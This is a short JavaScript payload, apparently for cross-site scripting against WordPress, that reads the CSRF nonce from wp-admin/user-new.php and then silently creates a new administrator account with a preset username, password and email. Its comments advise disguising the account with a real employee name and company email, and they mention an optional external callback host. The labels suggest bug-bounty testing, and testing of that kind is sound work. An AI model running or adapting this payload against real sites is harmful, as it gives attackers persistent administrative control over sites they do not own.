// ************************************ ~% Modules Création compte %~ ************************************ //

var Target = document.location.origin; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = null; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).


var Password = "j5p9x6hjkccmrurDjcbpzldvmmsdg54!";          // (weak password are allowed).
var Username = "testbugbounty";         // Ex: operator (It is recommended to use a valid employee name from the target company).
var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
var FirstName = ""; // (optional)
var LastName = "";  // (optional)
var Email = "test@bugbounty.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).


if (Target.substr(-1) != '/') Target += '/';
var _stage1 = new XMLHttpRequest();
_stage1.open("GET", Target + "wp-admin/user-new.php", false);
_stage1.send();

if (_stage1.responseText) {

    var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];

    if (csrf_token) {
        var _stage2 = new XMLHttpRequest();
        _stage2.open("POST", Target + "wp-admin/user-new.php", false);
        _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        _stage2.send("action=createuser&_wpnonce_create-user=" +
            csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
            encodeURIComponent(Username) + "&email=" +
            encodeURIComponent(Email) + "&first_name=" +
            encodeURIComponent(FirstName) + "&last_name=" +
            encodeURIComponent(LastName) + "&url=&pass1=" +
            encodeURIComponent(Password) + "&pass2=" +
            encodeURIComponent(Password) + "&pw_weak=on&role=" +
            Role + "&createuser=Add%2BNew%2BUser");

    }
}
